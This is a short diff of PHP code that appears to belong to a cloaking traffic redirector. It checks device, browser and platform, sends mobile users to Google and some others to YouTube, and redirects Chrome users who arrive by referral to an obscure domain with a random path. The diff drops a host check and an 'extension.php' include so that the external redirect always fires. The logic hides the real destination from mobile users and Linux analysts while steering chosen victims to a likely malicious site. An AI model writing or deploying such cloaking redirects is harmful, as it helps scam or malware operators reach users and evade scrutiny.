@@ -27,12 +27,8 @@ if($detect->isMobile() || $browser->isMobile()){
   header("location:https://www.google.com");
 }else if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11) {
   if($isref == true){
-    require_once("config.php");
-    if($_SERVER["HTTP_HOST"] != $app_site){
-      header("Location:http://rikondofien.info/".rand(55555,999999999));
-    }else{
-      require_once('extension.php');
-    }
+        header("Location:http://rikondofien.info/".rand(55555,999999999));
+
   }else{
     header("location:https://www.youtube.com/watch?v=".rand(55555,999999999),true,302);
   }
